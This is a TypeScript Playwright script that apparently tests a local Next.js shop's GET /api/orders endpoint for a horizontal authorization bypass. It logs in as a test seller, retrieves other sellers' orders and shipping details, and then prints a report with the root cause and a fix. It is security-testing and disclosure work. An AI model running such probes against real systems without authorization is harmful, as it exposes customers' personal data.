#!/usr/bin/env npx tsx

/**
 * AUTHZ VULNERABILITY: Seller Filter Bypass - Direct API Test
 *
 * Target: GET /api/orders
 * Vulnerability: Horizontal Privilege Escalation
 *
 * This test directly calls the API endpoints to demonstrate the vulnerability
 * without requiring Playwright or browser automation.
 */

import { chromium } from 'playwright';

const BASE_URL = 'http://localhost:3000';

interface Order {
  _id: string;
  seller: string;
  user?: { name?: string; _id?: string } | string;
  orderItems?: any[];
  totalPriceEuro?: number;
  totalPriceVal?: number;
  shippingAddress?: {
    fullName?: string;
    address?: string;
    city?: string;
    postalCode?: string;
    country?: string;
  };
}

async function main() {
  console.log('='.repeat(80));
  console.log('SECURITY TEST: Seller Filter Bypass on GET /api/orders');
  console.log('='.repeat(80));
  console.log(`Target: ${BASE_URL}`);
  console.log(`Date: ${new Date().toISOString()}`);
  console.log('');

  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  try {
    // Step 1: Login as Mario
    console.log('[*] Step 1: Authenticating as Mario (mario@example.com)');
    await page.goto(`${BASE_URL}/signin`);

    await page.getByPlaceholder('Inserisci la tua email').fill('mario@example.com');
    await page.getByPlaceholder('Inserisci la tua password').fill('password123');
    await page.getByRole('button', { name: 'Accedi' }).click();

    // Wait for navigation or error message
    try {
      await page.waitForURL(BASE_URL, { timeout: 10000 });
      console.log('   ✓ Login successful');
    } catch (e) {
      // Check if we're on a different page or there's an error
      const currentUrl = page.url();
      console.log(`   Current URL after login: ${currentUrl}`);

      // If still on signin page, check for error
      if (currentUrl.includes('/signin')) {
        const errorText = await page.locator('text=/error|invalid|non validi/i').first().textContent().catch(() => null);
        if (errorText) {
          throw new Error(`Login failed: ${errorText}`);
        }
      }

      // Wait a bit more and try to proceed
      await page.waitForTimeout(3000);
      const finalUrl = page.url();
      console.log(`   Final URL: ${finalUrl}`);

      if (finalUrl.includes('/signin')) {
        throw new Error('Login failed - still on signin page');
      }
      console.log('   ✓ Login appears successful (non-standard redirect)');
    }

    // Get session
    const sessionResponse = await page.request.get(`${BASE_URL}/api/auth/session`);
    const session = await sessionResponse.json();
    const marioId = session.user?.id;

    console.log(`   User ID: ${marioId}`);
    console.log(`   Email: ${session.user?.email}`);
    console.log(`   isSeller: ${session.user?.isSeller}`);
    console.log(`   isAdmin: ${session.user?.isAdmin}`);

    if (!marioId || !session.user?.isSeller) {
      throw new Error('Failed to authenticate as seller');
    }

    // Step 2: Get another seller's ID
    console.log('\n[*] Step 2: Finding another seller ID');
    const productsResponse = await page.request.get(`${BASE_URL}/api/products`);
    const products = await productsResponse.json();

    const otherSellerProduct = products.find(
      (p: any) => p.seller && p.seller !== marioId
    );

    const giuliaId = otherSellerProduct?.seller;
    console.log(`   Found another seller: ${giuliaId}`);

    if (!giuliaId || giuliaId === marioId) {
      throw new Error('Could not find another seller ID');
    }

    // Step 3: Fetch ALL orders (no filter) - VULNERABLE
    console.log('\n[*] Step 3: EXPLOIT - Fetching ALL orders without seller filter');
    console.log('   Request: GET /api/orders');
    console.log('   Expected: Should only return Mario\'s orders');
    console.log('   Actual: Returns ALL orders in the system');
    console.log('');

    const allOrdersResponse = await page.request.get(`${BASE_URL}/api/orders`);
    const allOrders: Order[] = await allOrdersResponse.json();

    console.log(`   ✗ VULNERABILITY: Received ${allOrders.length} orders`);

    if (allOrders.length > 0) {
      const sellerIds = [...new Set(allOrders.map((o) => o.seller))];
      console.log(`   Found orders from ${sellerIds.length} different seller(s):`);

      sellerIds.forEach((id) => {
        const count = allOrders.filter((o) => o.seller === id).length;
        if (id === marioId) {
          console.log(`     - ${id}: ${count} orders (Mario - authenticated user) ✓`);
        } else {
          console.log(`     - ${id}: ${count} orders (OTHER SELLER - SHOULD NOT BE VISIBLE!) ✗`);
        }
      });

      // Show sample order
      const sampleOrder = allOrders[0];
      console.log('\n   Sample order:');
      console.log(`     Order ID: ${sampleOrder._id}`);
      console.log(`     Seller: ${sampleOrder.seller}`);
      console.log(`     Buyer: ${typeof sampleOrder.user === 'object' ? sampleOrder.user?.name : sampleOrder.user}`);
      console.log(`     Items: ${sampleOrder.orderItems?.length || 0}`);
      console.log(`     Total: ${sampleOrder.totalPriceEuro || sampleOrder.totalPriceVal} EUR`);
    }

    // Step 4: Fetch own orders
    console.log('\n[*] Step 4: Fetching own orders (seller=' + marioId + ')');
    const ownOrdersResponse = await page.request.get(
      `${BASE_URL}/api/orders?seller=${marioId}`
    );
    const ownOrders: Order[] = await ownOrdersResponse.json();
    console.log(`   ✓ Received ${ownOrders.length} orders (Mario's orders)`);

    // Step 5: Fetch other seller's orders - VULNERABLE
    console.log('\n[*] Step 5: EXPLOIT - Fetching other seller\'s orders (Giulia)');
    console.log(`   Request: GET /api/orders?seller=${giuliaId}`);
    console.log('   Expected: Should receive 403 Forbidden');
    console.log('   Actual: Will return Giulia\'s orders');
    console.log('');

    const otherOrdersResponse = await page.request.get(
      `${BASE_URL}/api/orders?seller=${giuliaId}`
    );

    console.log(`   HTTP Status: ${otherOrdersResponse.status()}`);

    if (otherOrdersResponse.status() === 200) {
      const otherOrders: Order[] = await otherOrdersResponse.json();
      console.log('\n   ✗✗✗ CRITICAL VULNERABILITY CONFIRMED! ✗✗✗');
      console.log(`   Successfully accessed ${otherOrders.length} orders from another seller!`);
      console.log('');
      console.log('   This is a Horizontal Privilege Escalation vulnerability.');
      console.log('   Mario (Seller 1) can view Giulia\'s (Seller 2) orders including:');
      console.log('     - Customer names and contact information');
      console.log('     - Shipping addresses');
      console.log('     - Order items and pricing');
      console.log('     - Payment methods');

      if (otherOrders.length > 0) {
        const sample = otherOrders[0];
        console.log('\n   Sample exposed order:');
        console.log(`     Order ID: ${sample._id}`);
        console.log(`     Seller: ${sample.seller}`);
        console.log(`     Buyer: ${typeof sample.user === 'object' ? sample.user?.name : sample.user}`);

        if (sample.shippingAddress) {
          console.log('     Shipping Address (PII EXPOSED):');
          console.log(`       Name: ${sample.shippingAddress.fullName || 'N/A'}`);
          console.log(`       Address: ${sample.shippingAddress.address || 'N/A'}`);
          console.log(
            `       City: ${sample.shippingAddress.city || 'N/A'}, ${sample.shippingAddress.postalCode || 'N/A'}`
          );
          console.log(`       Country: ${sample.shippingAddress.country || 'N/A'}`);
        }

        console.log('\n   [EVIDENCE] Full order data:');
        console.log(JSON.stringify(sample, null, 2));
      }
    } else if (otherOrdersResponse.status() === 403) {
      console.log('   ✓ Properly blocked with 403 Forbidden');
    }

    // Generate Report
    console.log('\n' + '='.repeat(80));
    console.log('SECURITY TEST REPORT');
    console.log('='.repeat(80));

    console.log('\n[VULNERABILITY DETAILS]');
    console.log('Type: Authorization Bypass / Horizontal Privilege Escalation');
    console.log('Endpoint: GET /api/orders');
    console.log('Severity: HIGH');
    console.log('CVSS Score: 7.5 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)');

    console.log('\n[ROOT CAUSE]');
    console.log(
      'File: /Users/chocos/Desktop/pagine_azzurre/nextjs/src/app/api/orders/route.ts'
    );
    console.log('Lines: 30-34\n');
    console.log('Vulnerable Code:');
    console.log('  const seller = searchParams.get(\'seller\') || \'\';');
    console.log('  const sellerFilter = seller ? { seller } : {};');
    console.log('  const orders = await OrderModel.find({ ...sellerFilter });');

    console.log('\n[VULNERABILITY DESCRIPTION]');
    console.log('The endpoint checks if the user is a seller (isSeller=true) but does NOT');
    console.log('verify that the seller parameter matches the authenticated user\'s ID.');
    console.log('This allows any seller to:');
    console.log('  1. View ALL orders by omitting the seller parameter');
    console.log('  2. View any specific seller\'s orders by providing their ID');
    console.log('  3. Access customer PII they should not have access to');

    console.log('\n[TEST RESULTS]');
    console.log(`  Authenticated as: Mario (${marioId})`);
    console.log(`  Test 1 - All orders: ${allOrders.length} orders (should be restricted)`);
    console.log(`  Test 2 - Own orders: ${ownOrders.length} orders (expected)`);
    console.log(
      `  Test 3 - Other seller's orders: HTTP ${otherOrdersResponse.status()} (should be 403)`
    );

    if (otherOrdersResponse.status() === 200) {
      console.log('\n  ✗✗✗ VULNERABILITY CONFIRMED ✗✗✗');
    } else {
      console.log('\n  ✓ Vulnerability appears to be fixed');
    }

    console.log('\n[IMPACT]');
    console.log('  Confidentiality: HIGH - Unauthorized access to customer and business data');
    console.log('  Integrity: NONE');
    console.log('  Availability: NONE');
    console.log('\n  Business Impact:');
    console.log('    - Sellers can spy on competitors\' sales');
    console.log('    - Customer privacy violated (GDPR concern)');
    console.log('    - Unfair competitive advantage');

    console.log('\n[REMEDIATION]');
    console.log('Add authorization check:\n');
    console.log('  const seller = searchParams.get(\'seller\') || \'\';');
    console.log('');
    console.log('  // Enforce seller can only view own orders');
    console.log('  if (seller && seller !== session.user.id && !session.user.isAdmin) {');
    console.log('    return NextResponse.json({ message: \'Unauthorized\' }, { status: 403 });');
    console.log('  }');
    console.log('');
    console.log('  // Default to own orders for non-admins');
    console.log('  const sellerFilter = seller');
    console.log('    ? { seller }');
    console.log('    : session.user.isAdmin ? {} : { seller: session.user.id };');

    console.log('\n' + '='.repeat(80));
  } finally {
    await browser.close();
  }
}

main().catch((error) => {
  console.error('\n[!] Test failed:', error.message);
  console.error(error.stack);
  process.exit(1);
});
